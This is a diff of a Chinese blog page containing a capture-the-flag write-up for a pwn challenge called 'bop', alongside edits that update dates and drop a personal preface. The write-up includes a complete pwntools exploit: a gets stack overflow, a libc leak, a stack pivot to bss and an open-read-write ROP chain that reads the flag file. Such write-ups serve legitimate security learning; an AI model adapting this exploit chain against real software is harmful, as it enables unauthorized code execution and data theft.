@@ -24,7 +24,7 @@
 <meta property="og:description" content="路">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-02-04T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-02-04T14:56:30.471Z">
+<meta property="article:modified_time" content="2023-02-19T10:54:11.622Z">
 <meta property="article:author" content="nqoinaen">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -235,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.4k 字
+          2.3k 字
         
       </span>
     
@@ -246,7 +246,7 @@
         
         
         
-          6 分钟
+          5 分钟
         
       </span>
     
@@ -289,7 +289,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年2月4日 晚上
+                    本文最后更新于：2023年2月19日 晚上
                   
                 
               </p>
@@ -298,9 +298,8 @@
               <div class="markdown-body">
                 
                 <h2 id="前言">前言</h2>
-<p>zafu本科，本就没任何优势，喜欢pwn也没学出个名堂来，加之互联网寒冬，能找到啥工作，找不找的到工作，已经不报有期待。决定去考研了。选择了就奋力前行，希望不算太晚，这些暂时先告一段落</p>
 <h2 id="bop">bop</h2>
-<p>又不给libc,找libc是2.31的，看dockerfile得知<code>.flag.txt</code></p>
+<p>找libc是2.31的，看dockerfile得知<code>.flag.txt</code></p>
 <p>gets无限制栈溢出，泄露libc，栈迁移至bss执行orw,open要用syscall的</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-comment">#from LibcSearcher import *</span><br>local_file  = <span class="hljs-string">&#x27;./bop&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;mc.ax&#x27;</span>,<span class="hljs-number">30284</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims 			:r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br>pop_rdi=<span class="hljs-number">0x00000000004013d3</span><br>main=<span class="hljs-number">0x4012f9</span><br>gets=<span class="hljs-number">0x401352</span><br>ret=<span class="hljs-number">0x000000000040101a</span><br>bss=<span class="hljs-number">0x404080</span>+<span class="hljs-number">0x200</span><br>leave_ret=<span class="hljs-number">0x00000000004012f7</span><br><span class="hljs-comment">#debug()</span><br>pd=flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>,bss,ret,pop_rdi,elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>],elf.sym[<span class="hljs-string">&#x27;printf&#x27;</span>],pop_rdi,<span class="hljs-number">0</span>,gets)<br>pd=pd.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Do you bop? &#x27;</span>,pd)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><br><span class="hljs-comment">#libc=LibcSearcher(&quot;printf&quot;,libc_base)</span><br><span class="hljs-comment">#len(libc)</span><br><br><span class="hljs-comment">#libc_base = libc_base-libc.dump(&quot;printf&quot;)</span><br><span class="hljs-comment">#system = libc_base+libc.dump(&quot;system&quot;)            </span><br><span class="hljs-comment">#binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;) </span><br><br><span class="hljs-comment">#info(&#x27;libc_base&#x27;,libc_base)</span><br><br>pop_rsi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>)))<br>pop_rdx = libc_base + <span class="hljs-number">0x142c92</span><br>pop_rax = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>)))<br>syscall = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br>pd=<span class="hljs-string">b&quot;./flag.txt\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span><br>pd+=flat(ret,ret,ret,ret,pop_rdi,bss-<span class="hljs-number">0x20</span>,pop_rsi,<span class="hljs-number">0</span>,pop_rax,<span class="hljs-number">2</span>,syscall)<br>pd+=flat(pop_rdi,<span class="hljs-number">3</span>,pop_rsi,bss-<span class="hljs-number">0x140</span>,pop_rdx,<span class="hljs-number">0x40</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>])<br>pd+=flat(pop_rdi,<span class="hljs-number">1</span>,pop_rsi,bss-<span class="hljs-number">0x140</span>,pop_rdx,<span class="hljs-number">0x40</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])<br><span class="hljs-comment">#debug()</span><br>sl(pd)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
 
@@ -339,7 +338,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年2月4日</div>
+          <div>2023年2月19日</div>
         </div>
       
       
